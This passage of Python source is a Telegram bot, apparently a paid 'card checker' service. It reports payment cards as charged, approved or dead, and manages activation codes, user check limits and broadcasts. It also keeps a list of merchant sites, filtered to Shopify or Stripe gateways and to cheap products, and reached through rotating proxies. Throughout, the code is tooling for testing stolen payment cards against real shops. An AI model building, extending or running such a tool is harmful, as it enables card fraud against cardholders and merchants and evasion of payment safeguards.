<b>⚡ 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {all_results['total']} | 💎 Charged: {len(all_results['charged'])} | ✅ Approved: {len(all_results['approved'])} | ❌ Dead: {len(all_results['dead'])}</blockquote>
<blockquote>🌐 Gateway: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>💳 Checks left: {checks_left_display}</b>"""
            
            await bot.edit_message(user_id, status_msg.id, premium_emoji(summary), parse_mode='html')
        
    except Exception as e:
        print(f"[ERROR] Mass check error: {e}")
        await bot.send_message(user_id, premium_emoji(f"❌ An error occurred: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        user_current_check[user_id] = False
        if user_id in user_chk_mode:
            del user_chk_mode[user_id]

# ==================== أوامر الأدمن ====================

@bot.on(events.NewMessage(pattern='/admin'))
async def admin_panel(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    stats_text = """<b>👑 Admin Control Panel</b>

Use buttons below or direct commands:

├ <code>/gencode number</code> - Generate activation code
├ <code>/block user_id</code> - Block user
├ <code>/unblock user_id</code> - Unblock user
├ <code>/broadcast message</code> - Broadcast message
├ <code>/setlimit user_id number</code> - Set user limit
├ <code>/users</code> - List all users
├ <code>/user user_id</code> - Show user details
└ <code>/stats</code> - Bot statistics"""
    await event.reply(premium_emoji(stats_text), buttons=get_admin_menu_keyboard(), parse_mode='html')

@bot.on(events.NewMessage(pattern='/gencode'))
async def generate_code_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    args = event.message.text.split()
    checks_limit = DEFAULT_CHECK_LIMIT
    if len(args) >= 2:
        try:
            checks_limit = int(args[1])
        except:
            await event.reply(premium_emoji("❌ <b>Invalid number. Use a valid number.</b>"), parse_mode='html')
            return
    code = create_activation_code(checks_limit)
    await event.reply(premium_emoji(f"✅ <b>Code Generated!</b>\n\nCode: <code>{code}</code>\nChecks: {checks_limit}\n\nUser can use: <code>/redeem {code}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/block'))
async def block_user_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/block user_id</code>"), parse_mode='html')
        return
    target_id = int(args[1])
    block_user(target_id)
    await event.reply(premium_emoji(f"✅ <b>User {target_id} has been blocked!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/unblock'))
async def unblock_user_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/unblock user_id</code>"), parse_mode='html')
        return
    target_id = int(args[1])
    unblock_user(target_id)
    await event.reply(premium_emoji(f"✅ <b>User {target_id} has been unblocked!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/broadcast message</code>"), parse_mode='html')
        return
    message_text = args[1]
    users = get_all_users()
    total = len(users)
    success = 0
    status_msg = await event.reply(premium_emoji(f"📢 Broadcasting to {total} users..."), parse_mode='html')
    for user_id_str, user_data in users.items():
        try:
            await bot.send_message(int(user_id_str), premium_emoji(f"📢 <b>Broadcast from Admin</b>\n\n{message_text}"), parse_mode='html')
            success += 1
            await asyncio.sleep(0.5)
        except:
            pass
    await status_msg.edit(premium_emoji(f"✅ <b>Broadcast Complete!</b>\n\nSent to {success} of {total} users."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/setlimit'))
async def set_limit_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    args = event.message.text.split()
    if len(args) < 3:
        await event.reply(premium_emoji("❌ Usage: <code>/setlimit user_id number</code>"), parse_mode='html')
        return
    target_id = int(args[1])
    try:
        new_limit = int(args[2])
    except:
        await event.reply(premium_emoji("❌ Invalid number."), parse_mode='html')
        return
    users = load_users()
    target_id_str = str(target_id)
    if target_id_str not in users:
        users[target_id_str] = {}
    users[target_id_str]['check_limit'] = new_limit
    users[target_id_str]['premium'] = True
    save_users(users)
    await event.reply(premium_emoji(f"✅ <b>User {target_id} limit updated!</b>\n\nNew limit: {new_limit} checks"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/users'))
async def list_users_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    users = get_all_users()
    if not users:
        await event.reply(premium_emoji("📋 No users found."), parse_mode='html')
        return
    text = "<b>📋 Users List:</b>\n\n"
    for uid, data in users.items():
        username = data.get('username', 'Unknown')
        premium = "👑" if is_admin(int(uid)) else ("⭐" if data.get('premium', False) else "🆓")
        blocked = "🚫" if data.get('blocked', False) else "✅"
        total = data.get('total_checks', 0)
        text += f"`{uid}` | {username} | {premium} | {blocked} | {total} checks\n"
        if len(text) > 3500:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"users_{timestamp}.txt"
            async with aiofiles.open(filename, 'w') as f:
                await f.write(text)
            await event.reply(file=filename)
            try:
                os.remove(filename)
            except:
                pass
            text = ""
    if text:
        await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/user'))
async def user_info_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/user user_id</code>"), parse_mode='html')
        return
    target_id = args[1]
    users = load_users()
    user_data = users.get(target_id, {})
    if not user_data:
        await event.reply(premium_emoji(f"❌ User {target_id} not found."), parse_mode='html')
        return
    is_target_admin = is_admin(int(target_id))
    text = f"""<b>👤 User Data: {target_id}</b>

├ 📝 Username: @{user_data.get('username', 'Unknown')}
├ ⭐ Status: {'👑 ADMIN' if is_target_admin else '✅ PREMIUM' if user_data.get('premium', False) else '❌ FREE'}
├ 🚫 Blocked: {'Yes' if user_data.get('blocked', False) else 'No'}
├ 📊 Total Checks: {user_data.get('total_checks', 0)}
├ 💎 Successful Hits: {user_data.get('successful_checks', 0)}
├ 💳 Check Limit: {user_data.get('check_limit', 0) if not is_target_admin else 'UNLIMITED'}
├ 💰 Checks Left: {max(0, user_data.get('check_limit', 0) - user_data.get('total_checks', 0)) if not is_target_admin else '♾️'}
└ 📅 Registered: {user_data.get('registered_at', 'Unknown')[:10]}"""
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/stats'))
async def bot_stats_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    users = get_all_users()
    total_users = len(users)
    premium_users = len([u for u in users.values() if u.get('premium', False)])
    admin_count = len(ADMIN_IDS)
    blocked_users = len([u for u in users.values() if u.get('blocked', False)])
    total_checks = sum(u.get('total_checks', 0) for u in users.values())
    total_codes = len(load_codes())
    text = f"""<b>📊 Bot Statistics</b>

├ 👥 Total Users: {total_users}
├ 👑 Admins: {admin_count}
├ ⭐ Premium Users: {premium_users}
├ 🚫 Blocked Users: {blocked_users}
├ 📈 Total Checks: {total_checks}
├ 🎫 Total Codes: {total_codes}
└ ⏱️ Last Update: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    if is_admin(user_id):
        await event.reply(premium_emoji("👑 <b>You are admin, no need to redeem!</b>"), parse_mode='html')
        return
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/redeem CODE</code>"), parse_mode='html')
        return
    code = args[1].strip().upper()
    success, message = activate_code(user_id, code)
    if success:
        await event.reply(premium_emoji(f"✅ <b>Subscription Activated!</b>\n\n{message}"), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"❌ <b>Activation Failed!</b>\n\n{message}"), parse_mode='html')

# ==================== أوامر الأدمن لإدارة المواقع ====================

@bot.on(events.NewMessage(pattern='/mysites'))
async def admin_mysites_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    
    sites = load_admin_sites()
    if not sites:
        await event.reply(premium_emoji("📋 <b>No sites found.</b>\n\nUse /addsites or /site to add sites."), parse_mode='html')
        return
    
    sites_text = "\n".join([f"• {site}" for site in sites])
    await event.reply(premium_emoji(f"📋 <b>Sites ({len(sites)}):</b>\n\n{sites_text}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/site\s+'))
async def admin_add_site_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/site https://domain.com</code>"), parse_mode='html')
        return
    
    site = args[1].strip()
    site = site.replace('https://', '').replace('http://', '').rstrip('/')
    
    proxies = load_user_proxies(user_id)
    if not proxies:
        proxies = load_admin_proxies() if os.path.exists('proxy.txt') else None
        if not proxies:
            await event.reply(premium_emoji("❌ No proxies available to test site."), parse_mode='html')
            return
    
    status_msg = await event.reply(premium_emoji(f"🔄 Testing site: {site}..."), parse_mode='html')
    proxy = random.choice(proxies)
    result = await test_site(site, proxy)
    
    if result['status'] == 'alive':
        current_sites = load_admin_sites()
        if site not in current_sites:
            new_sites = current_sites + [site]
            save_admin_sites(new_sites)
            await status_msg.edit(premium_emoji(f"✅ <b>Site added successfully!</b>\n\n{site}"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"⚠️ <b>Site already exists:</b> {site}"), parse_mode='html')
    else:
        await status_msg.edit(premium_emoji(f"❌ <b>Could not add site!</b>\n\nSite appears to be dead or unreachable."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmsite\s+'))
async def admin_remove_site_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/rmsite https://domain.com</code>"), parse_mode='html')
        return
    
    url_to_remove = args[1].strip()
    current_sites = load_admin_sites()
    
    if url_to_remove not in current_sites:
        await event.reply(premium_emoji(f"❌ Site not found: {url_to_remove}"), parse_mode='html')
        return
    
    new_sites = [site for site in current_sites if site != url_to_remove]
    save_admin_sites(new_sites)
    
    await event.reply(premium_emoji(f"✅ <b>Site removed successfully!</b>\n\n{url_to_remove}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/sitecheck'))
async def admin_site_check_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    
    sites = load_admin_sites()
    if not sites:
        await event.reply(premium_emoji("❌ No sites to check."), parse_mode='html')
        return
    
    proxies = load_user_proxies(user_id)
    if not proxies:
        proxies = load_admin_proxies() if os.path.exists('proxy.txt') else None
        if not proxies:
            await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html')
            return
    
    user_pending_sites[user_id] = {
        'action': 'check',
        'sites': sites,
        'expires': time.time() + PENDING_TIMEOUT
    }
    
    await event.reply(premium_emoji("💰 <b>Select price range to filter sites:</b>\n\nSites with cheapest product above selected range will be removed."), buttons=get_price_filter_keyboard(), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearsites'))
async def admin_clear_sites_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    
    current_sites = load_admin_sites()
    count = len(current_sites)
    if count == 0:
        await event.reply(premium_emoji("❌ No sites to clear."), parse_mode='html')
        return
    
    save_admin_sites([])
    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} sites!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addsites'))
async def admin_add_sites_file_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Only admin can use this command.</b>"), parse_mode='html')
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file containing sites."), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Reply to a .txt file."), parse_mode='html')
        return
    
    file_path = await reply_msg.download_media()
    
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    
    sites = [line.strip() for line in content.split('\n') if line.strip()]
    sites = [s.replace('https://', '').replace('http://', '').rstrip('/') for s in sites]
    
    if not sites:
        await event.reply(premium_emoji("❌ No valid sites found in file."), parse_mode='html')
        os.remove(file_path)
        return
    
    os.remove(file_path)
    
    user_pending_sites[user_id] = {
        'action': 'add',
        'sites': sites,
        'expires': time.time() + PENDING_TIMEOUT
    }
    
    await event.reply(premium_emoji(f"💰 <b>Select price range to filter sites:</b>\n\n{len(sites)} sites found.\nSites with cheapest product above selected range will be removed.\n\nYou have {PENDING_TIMEOUT//60} minutes to select."), buttons=get_price_filter_keyboard(), parse_mode='html')

# ==================== معالجة فلتر السعر ====================

@bot.on(events.CallbackQuery(pattern=b"price_[1-4]"))
async def handle_price_filter(event):
    user_id = event.sender_id
    data = event.data.decode('utf-8')
    price_key = data.split('_')[1]
    
    await cleanup_expired_pending()
    
    if user_id not in user_pending_sites:
        await event.answer("⚠️ Session expired. Please try again.", alert=True)
        await event.edit(premium_emoji("❌ <b>Session Expired!</b>\n\nPlease try again."), parse_mode='html')
        return
    
    pending = user_pending_sites.pop(user_id)
    action = pending['action']
    sites = pending['sites']
    price_range = PRICE_RANGES[price_key]
    
    status_msg = await event.edit(premium_emoji(f"🔄 Processing {len(sites)} sites...\nPrice filter: {price_range['name']}"), parse_mode='html')
    
    proxies = load_user_proxies(user_id)
    if not proxies:
        proxies = load_admin_proxies() if os.path.exists('proxy.txt') else None
        if not proxies:
            await status_msg.edit(premium_emoji("❌ No proxies available."), parse_mode='html')
            return
    
    proxy = random.choice(proxies)
    
    await status_msg.edit(premium_emoji(f"🔄 Filtering by gateway (Shopify/Stripe only)..."), parse_mode='html')
    
    filtered_sites = []
    total = len(sites)
    
    for i, site in enumerate(sites):
        gateway = await get_site_gateway(site, proxy)
        if not gateway or not any(allowed in gateway for allowed in ALLOWED_GATEWAYS):
            continue
        
        if price_range["min"] > 0 or price_range["max"] < 999999:
            min_price = await get_site_min_price(site)
            if min_price is None or min_price <= price_range["max"]:
                filtered_sites.append(site)
        else:
            filtered_sites.append(site)
        
        if (i + 1) % 10 == 0:
            await status_msg.edit(premium_emoji(f"🔄 Progress: {i+1}/{total}\nValid sites: {len(filtered_sites)}"), parse_mode='html')
    
    if action == 'check':
        save_admin_sites(filtered_sites)
        result_text = f"""✅ <b>Site Check Complete!</b>

📊 <b>Summary:</b>
├ Total sites before: {len(sites)}
├ Sites after filter: {len(filtered_sites)}
├ Removed: {len(sites) - len(filtered_sites)}

💰 <b>Filter applied:</b> {price_range['name']}
🔌 <b>Gateway filter:</b> Shopify/Stripe only

Sites have been updated with only working sites."""
    else:
        current_sites = load_admin_sites()
        new_sites = [s for s in filtered_sites if s not in current_sites]
        all_sites = list(set(current_sites + filtered_sites))
        save_admin_sites(all_sites)
        result_text = f"""✅ <b>Sites Added with Filters!</b>

📊 <b>Summary:</b>
├ Total sites in file: {len(sites)}
├ Valid sites (Shopify/Stripe): {len(filtered_sites)}
├ New sites added: {len(new_sites)}
└ Total sites now: {len(all_sites)}

💰 <b>Filter applied:</b> {price_range['name']}
🔌 <b>Gateway filter:</b> Shopify/Stripe only

Use /sitecheck to verify all sites are working."""
    
    await status_msg.edit(premium_emoji(result_text), parse_mode='html')
    await event.answer()

# ==================== أحداث الأزرار ====================

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer("⏸️ Paused")

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer("▶️ Resumed")

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer("🛑 Stopped")
        await event.edit(premium_emoji("🛑 <b>Checking stopped by user.</b>"), parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"admin_stats"))
async def admin_stats_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only", alert=True)
        return
    users = get_all_users()
    total_users = len(users)
    premium_users = len([u for u in users.values() if u.get('premium', False)])
    blocked_users = len([u for u in users.values() if u.get('blocked', False)])
    total_checks = sum(u.get('total_checks', 0) for u in users.values())
    stats_text = f"""<b>📊 Bot Statistics</b>

├ 👥 Total Users: {total_users}
├ ⭐ Premium Users: {premium_users}
├ 🚫 Blocked Users: {blocked_users}
├ 📈 Total Checks: {total_checks}
└ ⏱️ Last Update: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
    await event.edit(premium_emoji(stats_text), buttons=get_admin_menu_keyboard(), parse_mode='html')
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"admin_broadcast"))
async def admin_broadcast_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only", alert=True)
        return
    await event.edit(premium_emoji("📢 <b>Send the message you want to broadcast to all users</b>\n\nTo cancel, send /cancel"), parse_mode='html')
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"admin_block"))
async def admin_block_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only", alert=True)
        return
    await event.edit(premium_emoji("🔨 <b>Send the user ID you want to block</b>\n\nExample: <code>123456789</code>\n\nTo cancel, send /cancel"), parse_mode='html')
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"admin_unblock"))
async def admin_unblock_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only", alert=True)
        return
    await event.edit(premium_emoji("🔓 <b>Send the user ID you want to unblock</b>\n\nExample: <code>123456789</code>\n\nTo cancel, send /cancel"), parse_mode='html')
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"admin_set_limit"))
async def admin_set_limit_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only", alert=True)
        return
    await event.edit(premium_emoji("📈 <b>Send user ID and new limit</b>\n\nExample: <code>123456789 5000</code>\n\nTo cancel, send /cancel"), parse_mode='html')
    await event.answer()

# ==================== التشغيل ====================

async def auto_add_admins():
    for admin_id in ADMIN_IDS:
        admin_id_str = str(admin_id)
        users = load_users()
        if admin_id_str not in users:
            users[admin_id_str] = {
                'user_id': admin_id,
                'username': 'admin',
                'registered_at': datetime.now().isoformat(),
                'total_checks': 0,
                'successful_checks': 0,
                'premium': True,
                'check_limit': ADMIN_MAX_CHECKS,
                'blocked': False,
                'is_admin': True,
                'subscription_expiry': 0
            }
            save_users(users)
            print(f"✅ Admin {admin_id} added automatically!")

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    await auto_add_admins()
    print("=" * 50)
    print("✅ SONIC BOT started successfully!")
    print("⚡ SONIC BOT")
    print(f"📡 API URL: {CHECKER_API_URL}")
    print("=" * 50)
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
